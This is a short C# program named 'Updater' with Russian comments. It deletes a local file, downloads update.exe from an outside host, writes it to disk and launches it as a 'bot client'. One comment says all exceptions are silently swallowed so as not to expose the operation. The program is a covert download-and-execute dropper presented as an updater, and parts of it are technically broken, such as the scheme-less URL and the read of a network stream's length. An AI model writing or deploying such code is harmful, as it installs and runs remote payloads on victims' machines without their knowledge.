using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Diagnostics;

namespace Updater
{
    class Program
    {
        static void Main(string[] args)
        {
            string pathToFile = @"D:\123.txt"; //путь к exe клиента бота
            string url = "setver.net/update.exe";
            //просто так
            //все исключения молча перехватывается, чтобы не палить контору.
            try
            {
                File.Delete(pathToFile);

                //скачивание и сохранение файла
                WebClient wc = new WebClient();
                Stream stream = wc.OpenRead(url);

                byte[] data = new byte[stream.Length];
                stream.Read(data, 0, (int)stream.Length);

                FileStream fs = File.Create(pathToFile);
                fs.Write(data, 0, data.Length);

                //запуск бота
                if (File.Exists(pathToFile))
                    Process.Start(pathToFile);
            }
            catch (Exception e)
            { }
        }
    }
}
